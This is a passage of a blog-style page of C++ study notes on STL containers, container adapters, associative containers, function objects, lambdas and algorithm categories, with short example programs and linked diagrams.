back</li></ul></li><li>Change size<ul><li>resize</li></ul></li></ol><div class="note success flat"><p>Remember that operations on the head are not suitable for data structures with contiguous physical addresses.</p></div><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>Features:</p><ul><li>A dynamic array that can be extended</li><li>Fast random access, fast insertion or deletion at the tail</li><li>Slow insertion or deletion in the middle or head</li></ul><p>Vector capacity: The size of actually allocated space</p><ul><li>s.capacity(): Returns current capacity</li><li>s.reserve(n): If capacity is less than n, extend s to make its capacity at least n</li><li>s.shrink_to_fit(): Reclaim unused element space, i.e., size and capacity function return values are equal</li></ul><div class="note danger flat"><p>Invalidation:<br>If adding elements causes vector to expand, then all iterators, pointers and references will be invalidated because memory space is reallocated; if there is no expansion, then only iterators after the inserted (or deleted) elements will be invalidated (because elements are moved).</p></div><h3 id="Deque"><a href="#Deque" class="headerlink" title="Deque"></a>Deque</h3><p>Features</p><ul><li>Fast insertion or deletion at both ends</li><li>Slow insertion or deletion in the middle</li><li>Random access is faster, but slower than vector container</li></ul><p>Deque is a segmented array in many STL implementations. Elements in the container are stored in fixed-size arrays in segments. In addition, the container needs to maintain an index array storing the first addresses of these segmented arrays, so deque’s continuity is an illusion.</p><p><img src="https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70" alt="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190217155302649.jpg?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg&#x3D;&#x3D;,size_16,color_FFFFFF,t_70"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//First output odd numbers in descending order, then output even numbers in ascending order.</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">istream_iterator&lt;<span class="type">int</span>&gt; <span class="title">i1</span><span class="params">(cin)</span>, i2</span>; <span class="comment">//Create a pair of input stream iterators, first is the beginning of standard input, second is the end of standard input</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s1</span><span class="params">(i1, i2)</span></span>;            <span class="comment">//Input data from standard input stream through input stream iterators</span></span><br><span class="line">    <span class="built_in">sort</span>(s<span class="number">1.</span><span class="built_in">begin</span>(), s<span class="number">1.</span><span class="built_in">end</span>());        <span class="comment">//Sort the input integers</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; s2;</span><br><span class="line">    <span class="comment">//The following loop traverses s1</span></span><br><span class="line">    <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = s<span class="number">1.</span><span class="built_in">begin</span>(); iter != s<span class="number">1.</span><span class="built_in">end</span>(); ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*iter % <span class="number">2</span> == <span class="number">0</span>) <span class="comment">//Even numbers go to s2 tail</span></span><br><span class="line">            s<span class="number">2.</span><span class="built_in">push_back</span>(*iter);</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//Odd numbers go to s2 head</span></span><br><span class="line">            s<span class="number">2.</span><span class="built_in">push_front</span>(*iter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Output the results of s2</span></span><br><span class="line">    <span class="built_in">copy</span>(s<span class="number">2.</span><span class="built_in">begin</span>(), s<span class="number">2.</span><span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>The underlying logic is a doubly linked list.</p><p>Features</p><ul><li>Fast insertion and deletion of elements at any position</li><li>Does not support random access</li></ul><p>Splice operation <code>s1.splice(p, s2, q1, q2)</code> means moving [q1, q2) from s2 to before the element pointed to by p in s1</p><h3 id="Forward-List"><a href="#Forward-List" class="headerlink" title="Forward List"></a>Forward List</h3><p>Features:</p><ul><li>Each node in a singly linked list only has a pointer to the next node, with no simple way to get the predecessor of a node;</li><li>insert, emplace and erase operations are not defined, but insert_after, emplace_after and erase_after operations are defined. Their parameters are the same as list’s insert, emplace and erase, but they don’t insert or delete the element pointed to by iterator p1, but operate on the node after the element pointed to by p1;</li><li>Does not support size operation.</li></ul><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><p>Features:</p><ul><li>array is a wrapper for built-in arrays, providing a safer and more convenient way to use arrays</li><li>The size of array objects is fixed. When defining, you need to specify both the element type and the container size.</li><li>Cannot dynamically change container size</li></ul><p><img src="https://picx.zhimg.com/80/v2-ea9110203c1e89cfaac565d2c3356953_1440w.jpeg"></p><h2 id="Sequential-Container-Insert-Iterators-and-Adapters"><a href="#Sequential-Container-Insert-Iterators-and-Adapters" class="headerlink" title="Sequential Container Insert Iterators and Adapters"></a>Sequential Container Insert Iterators and Adapters</h2><h3 id="Sequential-Container-Insert-Iterators"><a href="#Sequential-Container-Insert-Iterators" class="headerlink" title="Sequential Container Insert Iterators"></a>Sequential Container Insert Iterators</h3><p>Concept: Iterators used to insert elements at the head, tail, or specified position in the middle of a container, including front inserter (front_inserter), back inserter (back_inserter), and arbitrary position inserter (inserter).</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function">back_inserter <span class="title">iter</span><span class="params">(s)</span></span>;</span><br><span class="line">*(iter++) = <span class="number">5</span>; <span class="comment">//Insert 5 at the end of s through iter</span></span><br></pre></td></tr></table></figure><h3 id="Sequential-Container-Adapters"><a href="#Sequential-Container-Adapters" class="headerlink" title="Sequential Container Adapters"></a>Sequential Container Adapters</h3><p>Build some commonly used data structures based on sequential containers, which are wrappers of sequential containers:</p><ul><li>Stack: The first pushed element is popped last</li><li>Queue: The first pushed element is popped first</li><li>Priority queue: The “largest” element is popped first</li></ul><p>Stack can use any sequential container as the base container, but queue only allows <strong>front-inserting sequential containers</strong> (deque or list)</p><div class="note info flat"><p>The essence of priority queue is max (min) binary heap.</p></div><h4 id="Common-Operations-Supported-by-Stack-and-Queue"><a href="#Common-Operations-Supported-by-Stack-and-Queue" class="headerlink" title="Common Operations Supported by Stack and Queue"></a>Common Operations Supported by Stack and Queue</h4><ul><li>s1 op s2 op can be one of &#x3D;&#x3D;, !&#x3D;, &lt;, &lt;&#x3D;, &gt;, &gt;&#x3D;, it compares elements between two container adapters in <strong>lexicographic order</strong>;</li><li>s.size() returns the number of elements in s;</li><li>s.empty() returns whether s is empty;</li><li>s.push(t) pushes element t into s;</li><li>s.pop() pops an element from s. For stack, the element popped each time is the last pushed element, while for queue, the element popped each time is the first pushed element;</li><li><strong>Does not support iterators</strong> because they do not allow access to arbitrary elements.</li></ul><h4 id="Different-Operations-of-Stack-and-Queue"><a href="#Different-Operations-of-Stack-and-Queue" class="headerlink" title="Different Operations of Stack and Queue"></a>Different Operations of Stack and Queue</h4><p>Stack operations:</p><ul><li>s.top() returns a reference to the top element of the stack</li></ul><p>Queue operations:</p><ul><li>s.front() gets a reference to the head element of the queue</li><li>s.back() gets a reference to the tail element of the queue</li></ul><h4 id="Priority-Queue"><a href="#Priority-Queue" class="headerlink" title="Priority Queue"></a>Priority Queue</h4><p>Priority queue also supports element pushing and popping like stack and queue, but the order of element popping is related to element size. The element popped each time is always the “largest” element in the container.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">Sequence</span> = vector&lt;T&gt;</span><br><span class="line"><span class="keyword">class</span> priority_queue; </span><br></pre></td></tr></table></figure><p>The base container of priority queue must be a sequential container that <strong>supports random access</strong>.</p><ul><li>Supports the size, empty, push, pop member functions of stack and queue, with the same usage as stack and queue.</li><li>Priority queue <strong>does not support comparison operations</strong>.</li><li>Similar to stack, priority queue provides a top function that can get a reference to the next element to be popped (i.e., the “largest” element).</li></ul><h2 id="Associative-Containers"><a href="#Associative-Containers" class="headerlink" title="Associative Containers"></a>Associative Containers</h2><h3 id="Classification-and-Basic-Functions-of-Associative-Containers"><a href="#Classification-and-Basic-Functions-of-Associative-Containers" class="headerlink" title="Classification and Basic Functions of Associative Containers"></a>Classification and Basic Functions of Associative Containers</h3><p>For associative containers, each element has a key, and the order of elements in the container is arranged in <strong>ascending order</strong> of key values.</p><blockquote><p>Unlike sequential containers where finding elements has time complexity $O(n)$, associative containers organize elements into a <strong>balanced binary tree</strong> based on key size, with time complexity $O(\log n)$.</p></blockquote><p>Classification of ordered associative containers:</p><ul><li>Single associative containers (set and map)<ul><li>Key values are <strong>unique</strong>, one key value <strong>can only correspond to one element</strong></li></ul></li><li>Multiple associative containers (multiset and multimap)<ul><li>Key values are <strong>not unique</strong>, one key value can <strong>correspond to multiple elements</strong></li></ul></li><li>Simple associative containers (set and multiset)<ul><li>Container has only <strong>one type parameter</strong>, such as set<K>, multiset<K>, representing key type</li><li>The <strong>element of the container is the key itself</strong></li></ul></li><li>Binary associative containers (map and multimap)<ul><li>Container has <strong>two type parameters</strong>, such as map&lt;K,V&gt;, multimap&lt;K,V&gt;, representing key and additional data types respectively</li><li>The element type of the container is pair&lt;K,V&gt;, i.e., a binary tuple composed of <strong>key type and additional data type</strong></li></ul></li></ul><p>Interface</p><ul><li>Construction: List initialization, such as <code>map&lt;string, int&gt; id_map = &#123;&#123;"Xiao Ming", 1&#125;, &#123;"Li Hua", 2&#125;&#125;</code></li><li>Insert: insert</li><li>Delete: erase</li><li>Find: find</li><li>Bounds: lower_bound, upper_bound, equal_range</li><li>Count: count</li></ul><blockquote><p>C++11 new standard defines 4 unordered associative containers<br>unordered_set, unordered_map, unordered_multiset, unordered_multimap</p><ul><li>Do not use comparison operators to organize elements, but through a hash function and the &#x3D;&#x3D; operator of key type.</li><li>Provide the same operations as ordered containers</li><li>Can directly define unordered containers with built-in type keywords.</li><li>Cannot directly define unordered containers with custom class key types. If needed, must provide our own hash template.</li></ul></blockquote><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>Set is used to store a group of non-duplicate elements. Since the elements of the set are ordered, it can efficiently find specified elements and conveniently get the range of elements with specified size in the container.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;set&lt;<span class="type">double</span>&gt;::iterator,<span class="type">bool</span>&gt; r=s.<span class="built_in">insert</span>(v); </span><br><span class="line"><span class="keyword">if</span> (!r.second);</span><br><span class="line"><span class="comment">//Let me explain this a bit. The return value of the insert function is a binary tuple, first is an iterator, second is a bool value indicating whether insertion is possible.</span></span><br><span class="line"><span class="comment">//The first line constructs an r binary tuple, and the way to access its two elements is r.first and r.second.</span></span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>Map and set both belong to single associative containers. Their main difference is that the element type of set is the key itself, while the element type of map is a <strong>binary tuple</strong> composed of key and additional data.</p><p>When looking up an element by key in a set, it is generally only used to determine whether the element exists, while when looking up an element by key in a map, in addition to determining its existence, you can also get <strong>corresponding additional data</strong>.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">courses.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;CSAPP&quot;</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">//Binary tuple initialization can use pair&lt;first_type,second_type&gt; r = &#123;element1,element2&#125;</span></span><br><span class="line"><span class="comment">//At the same time, if you want to use it as a function parameter, you can omit the construction step and directly use make_pair(element1,element2)</span></span><br></pre></td></tr></table></figure><h3 id="Multiset-and-Multimap"><a href="#Multiset-and-Multimap" class="headerlink" title="Multiset and Multimap"></a>Multiset and Multimap</h3><p>Multiset is a set that <strong>allows duplicate elements</strong>, and multimap is a map that <strong>allows one key to correspond to multiple additional data</strong>.</p><p>The usage of multiset and set, multimap and map is similar, with only subtle differences in a few member functions. The difference is mainly manifested in <strong>removing the restriction that keys must be unique</strong>.</p><h1 id="Function-Objects"><a href="#Function-Objects" class="headerlink" title="Function Objects"></a>Function Objects</h1><h2 id="Basic-Concepts-and-Classification-of-Function-Objects"><a href="#Basic-Concepts-and-Classification-of-Function-Objects" class="headerlink" title="Basic Concepts and Classification of Function Objects"></a>Basic Concepts and Classification of Function Objects</h2><p>Function objects are actually objects that behave like functions. They can have no parameters or several parameters, and their function is to get a value or change the state of an operation.</p><blockquote><p>Any ordinary function and any object of a class that overloads the call operator operator() satisfies the characteristics of function objects</p></blockquote><p><img src="https://pic1.zhimg.com/80/v2-31d073302a8e96d89105422051760a76_1440w.png"></p><p>The following are two programs with the same result:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> <span class="comment">//Include numerical algorithm header file</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//Define an ordinary function</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mult</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(a) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The result by multipling all elements in a is &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(a, a + N, <span class="number">1</span>, mult) &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> <span class="comment">//Include numerical algorithm header file</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MultClass</span>&#123; <span class="comment">//Define MultClass class</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//Overload operator operator()</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(a) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The result by multipling all elements in a is &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(a, a + N, <span class="number">1</span>, <span class="built_in">MultClass</span>()) <span class="comment">//MultClass object passed to generic algorithm </span></span><br><span class="line">&lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>One ordinary function, one class overloads ().</p><p>Function objects provided by STL:</p><ul><li>Function objects for arithmetic operations</li><li>Function objects for relational operations and logical operations (require return value to be bool)</li></ul><p><img src="https://pic4.zhimg.com/80/v2-0e4a6bbd4d06bb5765d22c2d1662cdad_1440w.jpeg"></p><p><img src="https://pica.zhimg.com/80/v2-7df16ba33fcbf887ef22acad3f7855ee_1440w.jpeg"></p><h2 id="Lambda-Expressions"><a href="#Lambda-Expressions" class="headerlink" title="Lambda Expressions"></a>Lambda Expressions</h2><p><a href="https://www.cnblogs.com/DswCnblog/p/5629165.html">Lambda Expression Details</a><br>Definition: [capture list] (parameter list) -&gt; return type {function body}</p><ul><li>Capture list can capture local variables of the function where lambda is located</li><li>Parameter list, return type and function body are consistent with ordinary functions</li><li>Can be defined inside functions, understood as unnamed inline functions</li><li>auto lambda &#x3D; [] { return “Hello World!”; };</li><li>cout&lt;&lt; lambda() &lt;&lt;std::endl; &#x2F;&#x2F;Execution is consistent with function objects</li></ul><p>Capture list has value capture, reference capture and implicit capture methods</p><ul><li>int size &#x3D; 10, base &#x3D; 0; &#x2F;&#x2F;Local variables</li><li>auto longer &#x3D; [size](const string &amp;s){return s.size()&gt;size;} &#x2F;&#x2F;Value capture</li><li>auto longer &#x3D; [&amp;size](const string &amp;s){return s.size()&gt;size;}&#x2F;&#x2F;Reference capture</li><li>auto longer &#x3D; [&#x3D;](const string &amp;s){return s.size()&gt;base;}&#x2F;&#x2F;Implicit value capture</li><li>auto longer &#x3D; [&amp;](const string &amp;s){return s.size()&gt;size;}&#x2F;&#x2F;Implicit reference capture</li></ul><h2 id="Function-Adapters"><a href="#Function-Adapters" class="headerlink" title="Function Adapters"></a>Function Adapters</h2><p><img src="https://pic4.zhimg.com/80/v2-2ed3c65215b6553242c0785fb1c84ae7_1440w.jpeg"></p><p>bind2nd produces an instance of binder2nd function adapter</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> placeholders; <span class="comment">//Namespace for placeholder _n</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> intArr[] = &#123; <span class="number">30</span>, <span class="number">90</span>, <span class="number">10</span>, <span class="number">40</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">80</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(intArr) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(intArr, intArr + N)</span></span>;</span><br><span class="line"><span class="keyword">auto</span> p = <span class="built_in">find_if</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(),<span class="built_in">bind2nd</span>(greater&lt;&gt;(), <span class="number">40</span>));</span><br><span class="line"><span class="keyword">if</span> (p == a.<span class="built_in">end</span>())</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;no element greater than 40&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;first element greater than 40 is: &quot;</span> &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Function templates have much more content, learn gradually in practice</p></blockquote><h1 id="Algorithms"><a href="#Algorithms" class="headerlink" title="Algorithms"></a>Algorithms</h1><p>Characteristics of algorithms:</p><ul><li>STL algorithms are themselves function templates</li><li>Get input data through iterators</li><li>Process data through function objects</li><li>Output results through iterators</li><li>STL algorithms are generic, independent of specific data types and container types</li></ul><p>Classification of algorithms:</p><ul><li>Non-mutable sequence algorithms</li><li>Mutable sequence algorithms</li><li>Sorting and searching algorithms</li><li>Numerical algorithms</li></ul><blockquote><p>All algorithms used in the code can be found in the images, so no explanation is given.</p></blockquote><h2 id="Non-Mutable-Sequence-Algorithms"><a href="#Non-Mutable-Sequence-Algorithms" class="headerlink" title="Non-Mutable Sequence Algorithms"></a>Non-Mutable Sequence Algorithms</h2><p>Algorithms that do not directly modify the content of the operated container, used for finding specified elements, comparing whether two sequences are equal, counting elements, etc.</p><p><img src="https://pic3.zhimg.com/80/v2-cbe6b4025b2427cf9b3936eb3a467b96_1440w.png"></p><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> InputIterator, <span class="keyword">class</span> UnaryPredicate&gt;</span></span><br><span class="line"><span class="function">InputIterator <span class="title">find_if</span><span class="params">(InputIterator first, InputIterator last, UnaryPredicate pred)</span></span>;</span><br><span class="line"><span class="comment">//Find the first element in [first, last) range where pred(x) is true</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%BA%8F%E5%88%97%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/main.cpp">Non-Mutable Sequence Algorithm Examples</a></p><h2 id="Mutable-Sequence-Algorithms"><a href="#Mutable-Sequence-Algorithms" class="headerlink" title="Mutable Sequence Algorithms"></a>Mutable Sequence Algorithms</h2><p>Can modify the container objects they operate on, including algorithms for copying, deleting, replacing, reversing, rotating, swapping, partitioning, deduplicating, filling, shuffling sequences and generating a sequence.</p><p><img src="https://pic3.zhimg.com/80/v2-ec3de91c8801e4fbb7993a038d8ba58e_1440w.png"></p><p><img src="https://picx.zhimg.com/80/v2-e1eedaedbe50397fdac1453674369c25_1440w.png"></p><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> ForwardIterator, <span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fill</span><span class="params">(ForwardIterator first, ForwardIterator last, <span class="type">const</span> T&amp; x)</span></span>;</span><br><span class="line"><span class="comment">//Rewrite all elements in [first, last) range to x.</span></span><br></pre></td></tr></table></figure><div class="note danger flat"><p><a href="https://blog.csdn.net/qq_27788829/article/details/51181080?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-51181080-blog-80187847.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-51181080-blog-80187847.pc_relevant_default&utm_relevant_index=1">The Deceptive Nature of remove_if</a></p></div><blockquote><p>Removing is done by shifting (by means of copy assignment (until C++11)move assignment (since C++11)) the elements in the range in such a way that the elements that are not to be removed appear in the beginning of the range. Relative order of the elements that remain is preserved and the <em>physical</em> size of the container is unchanged. Iterators pointing to an element between the new <em>logical</em> end and the <em>physical</em> end of the range are still dereferenceable, but the elements themselves have unspecified values (as per <a href="https://en.cppreference.com/w/cpp/named_req/MoveAssignable" title="cpp&#x2F;named req&#x2F;MoveAssignable">MoveAssignable</a> post-condition).</p></blockquote><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E5%8F%AF%E5%8F%98%E5%BA%8F%E5%88%97%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/main.cpp">Mutable Sequence Algorithm Examples</a></p><h2 id="Sorting-and-Searching-Algorithms"><a href="#Sorting-and-Searching-Algorithms" class="headerlink" title="Sorting and Searching Algorithms"></a>Sorting and Searching Algorithms</h2><ul><li>Sort sequences</li><li>Merge two ordered sequences</li><li>Search ordered sequences</li><li>Set operations on ordered sequences</li><li>Heap algorithms</li></ul><p><img src="https://pic2.zhimg.com/80/v2-d880ec033f01b154525a1600bad9c14f_1440w.jpeg"></p><p><img src="https://pic3.zhimg.com/80/v2-e367dca4110be05e688ba80abffe29be_1440w.jpeg"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">RandomAccessIterator</span> , <span class="keyword">class</span> <span class="title class_">UnaryPredicate</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(RandomAccessIterator first, RandomAccessIterator last, UnaryPredicate comp)</span></span>;</span><br><span class="line"><span class="comment">//Use function object comp as &quot;&lt;&quot; to sort data in [first, last) range</span></span><br></pre></td></tr></table></figure><blockquote><p>sort requires first and last to be random iterator types, because sort’s specific implementation uses quicksort, and using random iterators is for efficiency considerations.</p></blockquote><h2 id="Numerical-Algorithms"><a href="#Numerical-Algorithms" class="headerlink" title="Numerical Algorithms"></a>Numerical Algorithms</h2><p>Find the “sum” of elements in a sequence, partial “sum”, “difference” of adjacent elements, or inner product of two sequences. The “+” for finding “sum”, “-“ for finding “difference”, and “+” and “·” for finding inner product can all be specified by function objects.</p><p><img src="https://pic2.zhimg.com/80/v2-b20e0971749bf96f4e9e97fdb6121fd2_1440w.png"></p><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>, <span class="keyword">class</span> <span class="title class_">BinaryFunction</span>&gt; ▫ <span class="function">OutputIterator <span class="title">partial_sum</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result, BinaryFunction op)</span></span>;</span><br><span class="line"><span class="comment">//Find partial &quot;sum&quot; of elements in [first, last) (so-called partial &quot;sum&quot; is a sequence with the same length as the input sequence, where the nth term is the &quot;sum&quot; of the first n elements of the input sequence)</span></span><br><span class="line"><span class="comment">//Use function object op as &quot;+&quot; operator, output result through result, return iterator pointing to the element after the last element of the output sequence</span></span><br></pre></td></tr></table></figure><p>[Numerical Algorithm Examples](<a 